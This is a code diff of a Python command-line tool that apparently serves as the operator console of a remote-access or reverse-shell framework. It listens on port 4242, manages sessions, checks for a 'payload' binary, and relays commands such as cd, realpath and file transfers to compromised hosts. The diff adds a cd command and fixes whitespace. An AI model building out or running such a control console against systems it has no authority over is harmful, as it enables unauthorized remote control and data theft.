@@ -36,7 +36,7 @@ class NetShell(cmd.Cmd):
         if not self.is_open:
             raise BrokenPipeError
         return line
-    
+
     def postcmd(self, stop, line):
         """Hook method executed just after a command dispatch is finished."""
 
@@ -88,7 +88,7 @@ class NetShell(cmd.Cmd):
             else:
                 path = pretty(self.server.send_command(f"realpath {line}"))
 
-        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n\n")
+        sys.stdout.write(f"{path}{'=' * (len(path))}\n\n{ls}\n")
     
     def do_send(self, line):
         check = self.server.send_command(f"sendingfile/{line}")
@@ -108,6 +108,11 @@ class NetShell(cmd.Cmd):
         if self.output:
             sys.stdout.write(f"{pretty(self.output)}\n")
 
+    def do_cd(self, line):
+        self.output = self.server.send_command(f"cd {line}")
+        if self.output:
+            sys.stdout.write(f"{pretty(self.output)}\n")
+
     def do_exit(self, line):
         logging.info(f"Closing connection from session {self.id +1}")
 
@@ -124,12 +129,12 @@ class LocalShell(cmd.Cmd):
         self.currentSession = None
         if len(sys.argv) > 1 and sys.argv[1] == "-l":
             self.do_listen(None)
-        
+
         if not os.path.isfile(os.path.join(PROJ_DIR, "payloads/payload")):
             logging.warning('Warning: Binary file "payload" is not present.')
             chk_payload(PROJ_DIR)
 
-        
+
     def emptyline(self):
         """Called when an empty line is entered in response to the prompt.
 
@@ -153,7 +158,7 @@ class LocalShell(cmd.Cmd):
             host, port = ("0.0.0.0", 4242)
         else:
             host, port = line.strip().split(" ")
-        
+
         sock = listen(host, port, 0)
         sock.sysinfo = SystemInfoGatherer()
         # sock.sysinfo.binaryGatherer(sock)
@@ -186,7 +191,7 @@ class LocalShell(cmd.Cmd):
         self.currentSession.id = (len(self.sessions) - 1)
         logging.info(f"Session {self.currentSession.id + 1} created")
         netshell_loop(self.currentSession)
-    
+
     def do_sessions(self, line):
         args = line.split(" ")
         if args and "-i" in args[0]:
